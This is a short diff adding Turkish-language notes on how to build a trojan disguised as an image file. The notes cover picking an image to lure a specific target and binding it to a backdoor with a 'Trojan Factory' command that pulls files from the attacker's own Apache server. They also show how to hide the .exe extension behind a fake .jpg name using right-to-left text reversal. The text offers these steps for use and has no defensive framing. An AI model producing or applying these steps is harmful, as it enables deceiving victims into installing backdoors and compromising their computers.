@@ -1,0 +1,8 @@
+Öncelikle hedefimizi iyi inceleyip ilgisini çekebilecek görsel bulmalıyız.
+Daha sonra ikon oluşturma sitelerinden bu görselle bir icon dosyası oluşturuyoruz.
+Görsel ile Backdoor'u birleştirmek için Trojan Factory'yi kuruyoruz.
+->python3 trojan_factory.py -f <görselin apache sunucumuzdaki linki> -e <Backdoor'un apache sunucumuzdaki linki> -o <dosyanın oluşturulacağı dizin ve dosya ismi.exe> -i <ikonun apache sunucumuzdaki linki>
+
+Oluşturduğumuz dosyanın dosya uzantısını gizleme:
+Dosya adını "Dosya_adı+jpg.exe" olarak değiştirin.
+Left to right aracını çalıştırıp jpg.exe yazan bölümü seçip kopyala yapıştır yapın.Bu şekilde olmazsa seçtiğiniz bölümü silip kendinizde yazabilirsiniz.
